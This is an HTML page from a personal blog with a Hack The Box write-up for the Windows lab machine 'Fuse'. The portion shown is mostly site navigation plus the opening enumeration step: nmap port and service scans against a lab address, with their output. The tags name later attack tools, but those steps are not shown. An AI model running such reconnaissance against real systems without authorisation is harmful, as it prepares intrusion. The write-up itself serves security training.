<!doctype html><html lang=en><head><title>[HTB] Machine: Fuse</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><link rel=stylesheet href=/application.650f674fc19266f4ea6c7b54bb6a4ffad10dfa641e3bea6de0a8472a99807590.css integrity="sha256-ZQ9nT8GSZvTqbHtUu2pP+tEN+mQeO+pt4KhHKpmAdZA="><link rel=icon type=image/png href=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png><meta property="og:title" content="[HTB] Machine: Fuse"><meta property="og:description" content="[HTB] Machine: Fuse"><meta property="og:type" content="article"><meta property="og:url" content="https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-08T00:00:00+00:00"><meta property="article:modified_time" content="2023-09-08T00:00:00+00:00"><meta name=description content="[HTB] Machine: Fuse"></head><body class="type-posts kind-page" data-spy=scroll data-target=#TableOfContents data-offset=80><div class="container-fluid bg-dimmed wrapper"><nav class="navbar navbar-expand-xl top-navbar final-navbar shadow"><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
<span class=navbar-toggler-icon></span></button>
<a class=navbar-brand href=/><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png alt=Logo>
Personal Blog</a>
<button class="navbar-toggler navbar-light" id=toc-toggler type=button>
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse lang-selector" id=top-nav-items><ul class="navbar-nav ml-auto"><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=menu-icon-center src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme"></a>
<a class="dropdown-item nav-link" href=# data-scheme=dark><img class=menu-icon-center src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a>
<a class="dropdown-item nav-link" href=# data-scheme=system><img class=menu-icon-center src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=main-logo alt=Logo>
<img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/>Cybersecurity</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/guided-hacking/>Guided Hacking</a><ul><li><a href=/posts/cybersecurity/guided-hacking/dll-injector/ title="[Guided Hacking] DLL Injector">[Guided Hacking] DLL Injector</a></li><li><a href=/posts/cybersecurity/guided-hacking/external-trainer/ title="[Guided Hacking] External Trainer">[Guided Hacking] External Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/internal-trainer/ title="[Guided Hacking] Internal Trainer">[Guided Hacking] Internal Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/overview/ title="[Guided Hacking] Overview">[Guided Hacking] Overview</a></li><li><a href=/posts/cybersecurity/guided-hacking/shellcode-injector/ title="[Guided Hacking] Shellcode Injector">[Guided Hacking] Shellcode Injector</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/>Hackthebox</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/>[HTB] Machines</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/hackthebox/machines/linux/>[HTB] Linux Machines</a><ul><li><a href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bolt/ title="[HTB] Machine: Bolt">[HTB] Machine: Bolt</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cronos/ title="[HTB] Machine: Cronos">[HTB] Machine: Cronos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luke/ title="[HTB] Machine: Luke">[HTB] Machine: Luke</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/ title="[HTB] Machine: MonitorsTwo">[HTB] Machine: MonitorsTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/october/ title="[HTB] Machine: October">[HTB] Machine: October</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/popcorn/ title="[HTB] Machine: Popcorn">[HTB] Machine: Popcorn</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenten/ title="[HTB] Machine: Tenten">[HTB] Machine: Tenten</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/windows/>[HTB] Windows Machines</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/atom/ title="[HTB] Machine: Atom">[HTB] Machine: Atom</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bart/ title="[HTB] Machine: Bart">[HTB] Machine: Bart</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastard/ title="[HTB] Machine: Bastard">[HTB] Machine: Bastard</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blackfield/ title="[HTB] Machine: Blackfield">[HTB] Machine: Blackfield</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/ title="[HTB] Machine: Breadcrumps">[HTB] Machine: Breadcrumps</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cascade/ title="[HTB] Machine: Cascade">[HTB] Machine: Cascade</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/chatterbox/ title="[HTB] Machine: Chatterbox">[HTB] Machine: Chatterbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/conceal/ title="[HTB] Machine: Conceal">[HTB] Machine: Conceal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/dropzone/ title="[HTB] Machine: Dropzone">[HTB] Machine: Dropzone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/flight/ title="[HTB] Machine: Flight">[HTB] Machine: Flight</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a class=active href=/posts/cybersecurity/hackthebox/machines/windows/fuse/ title="[HTB] Machine: Fuse">[HTB] Machine: Fuse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy">[HTB] Machine: Giddy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/intelligence/ title="[HTB] Machine: Intelligence">[HTB] Machine: Intelligence</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jeeves/ title="[HTB] Machine: Jeeves">[HTB] Machine: Jeeves</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/json/ title="[HTB] Machine: Json">[HTB] Machine: Json</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/mantis/ title="[HTB] Machine: Mantis">[HTB] Machine: Mantis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/minion/ title="[HTB] Machine: Minion">[HTB] Machine: Minion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/monteverde/ title="[HTB] Machine: Monteverde">[HTB] Machine: Monteverde</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/object/ title="[HTB] Machine: Object">[HTB] Machine: Object</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated">[HTB] Machine: Outdated</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier">[HTB] Machine: Querier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/rabbit/ title="[HTB] Machine: Rabbit">[HTB] Machine: Rabbit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel/ title="[HTB] Machine: Reel">[HTB] Machine: Reel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/resolute/ title="[HTB] Machine: Resolute">[HTB] Machine: Resolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/scrambled/ title="[HTB] Machine: Scrambled">[HTB] Machine: Scrambled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/search/ title="[HTB] Machine: Search">[HTB] Machine: Search</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes">[HTB] Machine: SecNotes</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo">[HTB] Machine: Silo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sniper/ title="[HTB] Machine: Sniper">[HTB] Machine: Sniper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/streamio/ title="[HTB] Machine: StreamIO">[HTB] Machine: StreamIO</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/tally/ title="[HTB] Machine: Tally">[HTB] Machine: Tally</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/worker/ title="[HTB] Machine: Worker">[HTB] Machine: Worker</a></li></ul></li></ul></li><li><a href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pentesting/>Pentesting</a><ul><li><a href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pwn.college/>pwn.college</a><ul><li><a href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/projects/>Projects</a><ul><li><a href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/windows/fuse/images/fuse.png)></div><div class=page-content><div class="author-profile ml-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_120x120_fit_box_3.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p>Friday, September 8, 2023</p></div><div class=title><h1>[HTB] Machine: Fuse</h1></div><div class=taxonomy-terms><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn, btn-sm">HTB</a></li><li class=rounded><a href=/tags/ldap/ class="btn, btn-sm">ldap</a></li><li class=rounded><a href=/tags/ldapsearch/ class="btn, btn-sm">ldapsearch</a></li><li class=rounded><a href=/tags/rpc/ class="btn, btn-sm">rpc</a></li><li class=rounded><a href=/tags/smb/ class="btn, btn-sm">smb</a></li><li class=rounded><a href=/tags/winrm/ class="btn, btn-sm">winrm</a></li><li class=rounded><a href=/tags/evil-winrm/ class="btn, btn-sm">evil-winrm</a></li><li class=rounded><a href=/tags/crackmapexec/ class="btn, btn-sm">crackmapexec</a></li><li class=rounded><a href=/tags/smbmap/ class="btn, btn-sm">smbmap</a></li><li class=rounded><a href=/tags/rpcclient/ class="btn, btn-sm">rpcclient</a></li><li class=rounded><a href=/tags/papercut/ class="btn, btn-sm">papercut</a></li><li class=rounded><a href=/tags/cewl/ class="btn, btn-sm">cewl</a></li><li class=rounded><a href=/tags/hydra/ class="btn, btn-sm">hydra</a></li><li class=rounded><a href=/tags/impacket-smbpasswd/ class="btn, btn-sm">impacket-smbpasswd</a></li><li class=rounded><a href=/tags/rpcclient/ class="btn, btn-sm">rpcclient</a></li><li class=rounded><a href=/tags/capcom-sys/ class="btn, btn-sm">capcom-sys</a></li><li class=rounded><a href=/tags/driver/ class="btn, btn-sm">driver</a></li><li class=rounded><a href=/tags/visual-studio/ class="btn, btn-sm">visual-studio</a></li><li class=rounded><a href=/tags/eoploaddriver/ class="btn, btn-sm">eoploaddriver</a></li><li class=rounded><a href=/tags/msfvenom/ class="btn, btn-sm">msfvenom</a></li><li class=rounded><a href=/tags/seloaddriverprivilege/ class="btn, btn-sm">SeLoadDriverPrivilege</a></li></ul></div><div class=post-content id=post-content><h1 id=fuse>Fuse</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>└─$ nmap -Pn -p- 10.10.10.193 -T4                         
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:32 BST
Nmap scan report for 10.10.10.193 (10.10.10.193)
Host is up (0.092s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49680/tcp open  unknown
49698/tcp open  unknown
</code></pre><pre tabindex=0><code>└─$ nmap -Pn -p53,80,88,135,139,445,464,593,636,3268,3269,5985 -sC -sV 10.10.10.193 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 17:23 BST
Nmap scan report for 10.10.10.193 (10.10.10.193)
Host is up (0.16s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn&#39;t have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-09 16:35:34Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  ��7a)V       Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?
